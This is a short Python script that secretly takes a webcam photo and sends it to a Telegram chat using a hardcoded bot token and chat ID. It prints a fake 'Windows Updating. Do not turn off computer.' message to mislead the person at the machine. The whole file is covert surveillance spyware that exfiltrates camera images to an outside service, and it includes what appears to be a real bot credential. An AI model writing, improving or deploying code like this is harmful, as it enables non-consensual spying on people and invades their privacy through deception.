import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')

import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')

import cv2
import sys
import telegram
import asyncio

# Define your bot token and chat ID
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'

# Capture the snapshot
def capture_snapshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        print("Failed to capture image.")
        sys.exit(0)
    else:
        cv2.imwrite('snapshot.png', frame)
        print("Windows Updating. Do not turn off computer.")

# Define an asynchronous function to send the image to Telegram
async def send_image_to_telegram():
    bot = telegram.Bot(token=BOT_TOKEN)
    with open('snapshot.png', 'rb') as photo:
        await bot.send_photo(chat_id=CHAT_ID, photo=photo)
    print("Windows Updating. Do not turn off computer.")

# Run the capture and sending functions
def main():
    capture_snapshot()
    asyncio.run(send_image_to_telegram())

if __name__ == '__main__':
    main()
